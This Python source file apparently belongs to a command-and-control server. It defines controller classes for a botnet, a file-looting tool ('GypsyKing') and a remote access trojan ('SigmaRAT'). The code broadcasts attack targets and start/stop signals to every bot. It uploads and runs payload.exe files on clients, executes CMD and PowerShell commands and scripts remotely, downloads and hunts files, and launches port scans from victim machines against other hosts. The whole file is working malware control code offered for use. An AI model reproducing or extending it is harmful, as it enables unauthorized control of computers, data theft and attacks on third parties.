import os

from multiprocessing import Pipe
from typing import Callable, Union
from time import sleep

from .micro import MicroServer

class BasicControler:
    def __init__(self, pipe : Pipe, server_callback : Callable):
        self.name = "Basic Controler"
        self.pipe = pipe
        self.server = server_callback
        self.headers = self.server.sysHeadears
        self.pauseOverflow = self.server.config["PAUSE_OVERFLOW"]
    
    def check_signal(self) -> Union[list, bool]:
        sleep(self.pauseOverflow)
        check = self.pipe.poll()
        if check:
            recv = self.pipe.recv()
            return recv
        else:
            return None
    
    def sendPipeData(self, data: list):
        try:
            self.pipe.send(data)
        except Exception as e:
            self.server.Msg(f"[!!] ERROR: Try Pipe send data [!!] : {e}")
    
    def sendMsg2Client(self, cliID: str, message: str) -> None:
        if cliID.lower() == "all":
            for cli in self.server.Central.clients.values():
                cli.sendMsg(message)
            return None
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"Client ID:{cliID} is not connected")
            return None
        client.sendMsg(message)
        return True

    def saveCliInfo(self, cliID: str) -> None:
        if cliID.lower() == "all":
            if len(self.server.Central.clients) == 0:
                self.server.Msg("No connected clients")
                return
            response = ""
            for client in self.server.Central.clients.values():
                 response += f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
            self.server.Msg(response, onlyLog=True)
            return
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"[!!] ERROR: Client ID={cliID} does not connected [!!]")
            return
        response = f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
        self.server.Msg(response, onlyLog=True)
    
    def _servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case "start":
                self.server.listening()
            case "stop":
                self.server.stopListening()
            case "conf":
                self.server.Msg(self.server.config, dictFormat=True, dictName="Server Config")
            case "admin":
                match cmd[2]:
                    case "on":
                        self.server.Http.adminEnable = True
                    case "off":
                        self.server.Http.adminEnable = False
            case "end":
                self.server.turnOFF()
            case _:
                self.servCMD(cmd)

    def servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")

    def _taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case "show":
                self.server.Tasker.showTask()
            case _:
                self.taskCMD(cmd)

    def taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def _cliCMD(self, cmd: list) -> None:
        if not self.server.is_listening:
            self.server.Msg("[!!] Cant not execute command. Server not listening [!!]")
            return
        match cmd[1]:
            case "show":
                self.server.Central.showClient()
            case "send":
                try:
                    self.sendMsg2Client(cmd[2], cmd[3])
                except:
                    pass
            case "save":
                try:
                    self.saveCliInfo(cmd[2])
                except:
                    pass

            case _:
                self.cliCMD(cmd)
    
    def cliCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def dracoCMD(self, cmd: list) -> None:
        match cmd[1]:
            case "conf":
                conf = self.server.config
                self.sendPipeData([conf])
            case _:
                self.server.Msg("[!!] Unknown command (server - draconus) [!!]")
    
    def unpackSysMsg(self, msg: str) -> list:
        msg = msg.split(self.headers)
        cmd = []
        for c in msg:
            if c == "" or c == " ":
                continue
            cmd.append(c)
        if len(cmd) == 0:
            return None
        return cmd
    
    def makeSysMsg(self, cmd : list) -> str:
        msg = self.headers + self.headers.join(cmd) + self.headers
        return msg
  
    def _sysCMD(self, msg: str, handler: object) -> None:
        self.server.Msg(f"SYS MSG:{msg}", sender=handler.ID, dev=True)
        cmd = self.unpackSysMsg(msg)
        if not cmd:
            self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
            return
        match cmd[0]:
            case "i":
                handler.updateInfo(cmd[1:])
            case "e":
                self.server.Msg(msg=cmd[1], sender=f"({handler.ID}){handler.Addr}")
                handler.sendMsg(cmd[1])
            case _:
                self.sysCMD(cmd, handler)
    
    def sysCMD(self, cmd: list, handler: object) -> None:
        self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")

    def _execCMD(self, cmd : list) -> None:
        match cmd[0]:
            case "serv":
                self._servCMD(cmd)
            case "task":
                self._taskCMD(cmd)
            case "cli":
                self._cliCMD(cmd)
            case "help":
                self.server.Msg(self.help())
            case "draco":
                self.dracoCMD(cmd)
            case _:
                self.execCMD(cmd)
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case _:
                self.server.Msg("Unknown Command")
    
    def checkCMD(self, cmd: list) -> None:
        if not isinstance(cmd, list):
            self.server.Msg("[!!] WRONG command syntax. Must be a list [!!]")
        else:
            self._execCMD(cmd)
    
    def hilfe(self) -> str:
        hilfe = ""
        hilfe += f"\n***************{self.server.SERV_TYPE} HELP ****************************\n"
        hilfe += "  ss serv admin on     - Enable Http Admin Function\n"
        hilfe += "  ss serv admin off    - Disable Http Admin Function\n"
        return hilfe
    
    def help(self) -> str:
        return self.hilfe()

    
    def START(self) -> None:
        self.server.Msg("Controler Start", dev=True)
        while True:
            cmd = self.check_signal()
            if not cmd:
                continue
            self.server.Msg(f"CMD: {cmd}", dev=True)
            self.checkCMD(cmd)
            
            



class BasicBotControler(BasicControler):
    def __init__(self, pipe : Pipe, server_callback: object):
        super().__init__(pipe, server_callback)
        self.name = "BasicBot Controler"
    
    def setTarget(self, target: str) -> None:
        self.server.targetAttack = target
        self.sendMsg2Client("all", f"tar {target}")
    
    def setAttack(self) -> None:
        self.server.signalAttack = True
        self.sendMsg2Client("all", "ATT")
    
    def stopAttack(self) -> None:
        self.server.signalAttack = False
        self.sendMsg2Client("all", "STP")
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case "tar":
                self.setTarget(cmd[1])
            case "att":
                self.setAttack()
            case "stp":
                self.stopAttack()
            case _:
                self.server.Msg("Unknown Command")

    def help(self) -> str:
        hilfe = "\n*************** BOTNET Commands ********************\n"
        hilfe += "-- ss tar <address>          - Set target to all clients\n"
        hilfe += "-- ss att                    - Send signal to start attack\n"
        hilfe += "-- ss stp                    - Send signal to stop attack\n"

        return self.hilfe() + hilfe


class LooterControler(BasicControler):
    def __init__(self, pipe : Pipe, server_callback: object):
        super().__init__(pipe, server_callback)
        self.name = "GypsyKing Controler"

    def sysCMD(self, cmd: list, handler: object) -> None:
        match cmd[0]:
            case "d":
                if len(cmd) == 3:
                    self.server.setCoordinates(cmd[1], cmd[2], handler)
                elif len(cmd) == 4:
                    self.server.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
                else:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")

            case "w":
                if len(cmd) < 4:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
                    return
                clinfo = self.server.prepareReadMe(cmd[1], cmd[2], handler)
                self.server.prepareWorkplace(cmd[1], clinfo, cmd[3])
            case _:
                self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case "up":
                self.server.uploadFile(cmd[1], cmd[2])
            case _:
                self.server.Msg("Unknown Command")
    
    def help(self) -> str:
        hilfe = "\n*************** Looter Commands ********************\n"
        hilfe += "  ss up <cli_ID> <file_name>        - Upload file to client. File must be in payload dir\n"
        hilfe += "  ex: ss up 3 payload.exe           - Upload payload.exe to client no.3\n"
        return self.hilfe() + hilfe
    



class RatControler(BasicControler):
    def __init__(self, pipe : Pipe, server_callback: object):
        super().__init__(pipe, server_callback)
        self.name = "RAT Controler"

    def sysCMD(self, cmd: list, handler: object) -> None:
        match cmd[0]:
            case "d":
                if len(cmd) == 3:
                    self.server.setCoordinates(cmd[1], cmd[2], handler)
                elif len(cmd) == 4:
                    self.server.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
                else:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")

            case "w":
                if len(cmd) < 4:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
                    return
                clinfo = self.server.prepareReadMe(cmd[1], cmd[2], handler)
                self.server.prepareWorkplace(cmd[1], clinfo, cmd[3])
            case _:
                self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
    
    def scan(self, cmd: list) -> None:
        if len(cmd) == 3:
            msg = self.makeSysMsg(["SP", cmd[1], cmd[2]])
            self.sendMsg2Client(cmd[0], msg)
        elif len(cmd) == 4:
            msg = self.makeSysMsg(["SP", cmd[1], cmd[2], cmd[3]])
            self.sendMsg2Client(cmd[0], msg)
        else:
            self.server.Msg("[!!] Wrong Scan Command [!!]")
    
    def shellCmd(self, cmd: list) -> None:
        msg = self.makeSysMsg(cmd[1:])
        self.sendMsg2Client(cmd[0], msg)
    
    def psCmd(self, cmd: list) -> None:
        msg = self.makeSysMsg(["ps"] + cmd[1:])
        self.sendMsg2Client(cmd[0], msg)
    
    def downFile(self, cmd: list) -> None:
        msg = self.makeSysMsg(["send"] + [cmd[1]])
        self.sendMsg2Client(cmd[0], msg)
    
    def huntFile(self, cmd: list) -> None:
        msg = self.makeSysMsg(["hunt"] + [cmd[1]])
        self.sendMsg2Client(cmd[0], msg)
    
    def sendPScript(self, cli_ID: str, fname: str) -> None:
        data = self.server.loadTextScript(fname)
        if not data:
            return
        psmsg = self.makeSysMsg(["pss", data])
        if self.sendMsg2Client(cli_ID, psmsg):
            self.server.Msg(f"Send script to client no.{cli_ID}")
    
    def sendCMDcommand(self, cli_ID: str, cmd: str) -> None:
        msg = self.makeSysMsg(["cmd", cmd])
        self.sendMsg2Client(cli_ID, msg)
        
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case "up":
                self.server.uploadFile(cmd[1], cmd[2])
            case "scan":
                self.scan(cmd[1:])
            case "run":
                if len(cmd) < 3:
                    return
                msg = self.makeSysMsg(["RUN", cmd[2]])
                self.sendMsg2Client(cmd[1], msg)
            case "shell":
                self.shellCmd(cmd[1:])
            case "ps":
                self.psCmd(cmd[1:])
            case "down":
                self.downFile(cmd[1:])
            case "hunt":
                self.huntFile(cmd[1:])
            case "pss":
                if len(cmd) < 3:
                    return
                self.sendPScript(cmd[1], cmd[2])
            case "cmd":
                if len(cmd) < 3:
                    return
                self.sendCMDcommand(cmd[1], cmd[2])


            case _:
                self.server.Msg("Unknown Command")
    
    def help(self) -> str:
        hilfe = "\n*************** SigmaRAT Commands ********************\n"
        hilfe += "  ss up <cli_ID> <file_name>                        - Upload file to client. File must be in payload dir\n"
        hilfe += "  ex: ss up 3 payload.exe                           - Upload payload.exe to client no.3\n"
        hilfe += "  ss down <cli_ID> <file_name>                      - Download file from client. See OUTPUT manual dir\n"
        hilfe += "  ex: ss down 4 image.jpg                           - Download file image.jpg from client no.4\n"
        hilfe += "  ss scan <cli_ID> <port_min> <port_max>            - Start scanning ports on client machine: port_min - port_max\n"
        hilfe += "  ex: ss scan 1 10 2000                             - Start scanning ports 10 - 2000 on clients no.1\n"
        hilfe += "  ss scan <cli_ID> <port_min> <port_max> <host>     - Start scanning ports on target host from clients machine\n"
        hilfe += "                                                    - you can put ip addrress or target site (ex: www.google.com)\n"
        hilfe += "  ex: ss scan 3 19 64000 192.168.2.22               - Start scaning ports 19 - 64000 on machine ip 192.168.2.22 from client no.3\n"
        hilfe += "  ex: ss scan 3 1 500 www.google.com                - Start scanning ports 1 - 500 on google.com from client no.3\n"
        hilfe += "  ss shell <cli_ID> cd <dir_name>                   - Change directory on target clients\n"
        hilfe += "  ex: ss shell 5 cd c:/windows                      - Change directory to windows on client no.5\n"
        hilfe += "  ss shell <cli_ID> pwd                             - Show actual directory on target client\n"
        hilfe += "  ss cmd <cli_ID> <command>                         - Execute command in windows CMD on target client"
        hilfe += "  ss run <cli_ID> <file_name>                       - Run file (like exe) on target client\n"
        hilfe += "  ex: ss run 1 payload.exe                          - Run payload.exe on client no.1\n"
        hilfe += "  ss ps <cli_ID> <command>                          - Execute command in WindowsPowerShell on target client\n"
        hilfe += "  ss pss <cli_ID> <file_name>                       - load PowerShell Script from file, send and execute on target client. Recive response\n"
        hilfe += "                                                    - file must be in PAYLOAD Dir !!\n"
        hilfe += "  ex: ss pss 3 my_script.ps1                        - Send script from 'my_script.ps1' to client no.3\n"

        return self.hilfe() + hilfe